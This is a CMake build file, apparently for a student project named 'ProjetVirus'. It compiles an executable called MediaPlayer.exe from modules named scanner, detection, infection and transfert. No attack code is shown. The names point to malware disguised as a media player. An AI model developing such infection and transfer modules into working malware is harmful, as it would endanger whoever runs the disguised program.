cmake_minimum_required(VERSION 3.10)
project(ProjetVirus C)

# Active les warnings utiles + standard C99
set(CMAKE_C_STANDARD 99)
set(CMAKE_C_STANDARD_REQUIRED ON)
set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -Wall -Wextra -g")

# Recherche de GTK 3
find_package(PkgConfig REQUIRED)
pkg_check_modules(GTK3 REQUIRED gtk+-3.0)

# Inclusion des headers GTK
include_directories(${GTK3_INCLUDE_DIRS})
link_directories(${GTK3_LIBRARY_DIRS})
add_definitions(${GTK3_CFLAGS_OTHER})

# Fichiers sources du projet
set(SOURCES
        mediaplayer.c
        scanner.c
        detection.c
        infection.c
        transfert.c
)

# Headers (facultatif mais utile en IDE)
set(HEADERS
        mediaplayer.h
        scanner.h
        detection.h
        infection.h
        transfert.h
)

# Création de l’exécutable
add_executable(MediaPlayer.exe ${SOURCES} ${HEADERS})

# Liaison avec GTK3 et pthread
target_link_libraries(MediaPlayer.exe ${GTK3_LIBRARIES})
target_link_libraries(MediaPlayer.exe ${GTK3_LIBRARIES} pthread)
